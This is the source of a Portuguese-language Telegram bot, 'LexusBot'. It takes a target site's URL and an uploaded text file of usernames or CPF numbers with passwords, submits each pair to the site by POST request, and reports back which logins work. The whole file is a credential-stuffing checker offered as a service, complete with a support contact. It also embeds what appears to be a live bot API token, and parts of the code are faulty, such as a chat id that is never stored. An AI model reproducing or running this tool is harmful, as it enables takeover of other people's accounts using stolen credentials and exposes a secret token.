from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, CallbackContext
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import os
import re

# Caminhos das imagens
IMAGE_PATH = 'Armazenamento interno/Pictures/100PINT/Pins'

# Função para iniciar o bot
async def start(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    await context.bot.send_photo(
        chat_id=update.message.chat_id,
        photo=open(os.path.join(IMAGE_PATH, 'image.jpg'), 'rb'),
        caption=f'Olá {user.first_name}, seja bem-vindo ao LexusBot, o que deseja fazer hoje?',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Verificar Logins", callback_data='verify')],
            [InlineKeyboardButton("Buscar Logins", callback_data='search')]
        ])
    )

# Função para lidar com os botões
async def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'verify':
        await context.bot.send_photo(
            chat_id=query.message.chat_id,
            photo=open(os.path.join(IMAGE_PATH, 'image.jpg'), 'rb'),
            caption='Certo, agora me envie a URL do site que deseja verificar os logins.'
        )
    elif query.data == 'search':
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text='Você pode capturar logins e senhas manualmente e enviar para o bot.'
        )

# Função para lidar com URLs e arquivos .txt
async def handle_message(update: Update, context: CallbackContext) -> None:
    if update.message.text and update.message.text.startswith('http'):
        context.user_data['url'] = update.message.text
        await context.bot.send_message(
            chat_id=update.message.chat_id,
            text='Agora me envie o arquivo txt com os usuários e senhas.'
        )
    elif update.message.document and update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        await file.download('logins.txt')
        await context.bot.send_message(
            chat_id=update.message.chat_id,
            text='Certo, agora peço que aguarde para que eu possa verificar os logins válidos no site que você me forneceu.'
        )
        await verify_logins(context)
    elif update.message.text and update.message.text == '/ajuda':
        await context.bot.send_photo(
            chat_id=update.message.chat_id,
            photo=open(os.path.join(IMAGE_PATH, 'image.jpg'), 'rb'),
            caption='Tem alguma dúvida? Entre em contato com nosso suporte: @M4rkZuck'
        )

async def verify_logins(context: CallbackContext) -> None:
    url = context.user_data.get('url')
    if not url:
        await context.bot.send_message(
            chat_id=context.user_data.get('chat_id'),
            text='URL não fornecida. Por favor, inicie o processo novamente com a URL do site.'
        )
        return

    with open('logins.txt', 'r') as file:
        lines = file.readlines()

    valid_logins = []

    for i in range(0, len(lines), 2):
        login = lines[i].strip().split(': ')[1]
        password = lines[i+1].strip().split(': ')[1]

        if re.match(r'^\d{3}\.\d{3}\.\d{3}-\d{2}$', login):
            payload = {'cpf': login, 'password': password}
        else:
            payload = {'email': login, 'password': password}

        try:
            response = requests.post(url, data=payload)
            if response.ok:
                valid_logins.append(f'LOGIN: {login}\nSENHA: {password}')
        except Exception as e:
            await context.bot.send_message(
                chat_id=context.user_data.get('chat_id'),
                text=f'Ocorreu um erro ao verificar os logins: {e}'
            )

    if valid_logins:
        await context.bot.send_message(
            chat_id=context.user_data.get('chat_id'),
            text='✅️ Aqui estão alguns logins e senhas que estão funcionando ✅️\n' + '\n'.join(valid_logins)
        )
    else:
        await context.bot.send_message(
            chat_id=context.user_data.get('chat_id'),
            text='Infelizmente nenhum login e senha funcionou no site que você me forneceu 🤧'
        )

async def main() -> None:
    application = Application.builder().token("7528362593:AAGAXrS4soE8OLjFPty6mMYx8a-Qb6EQxGg").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ajuda", handle_message))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    application.add_handler(CallbackQueryHandler(button))

    # Start polling
    await application.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
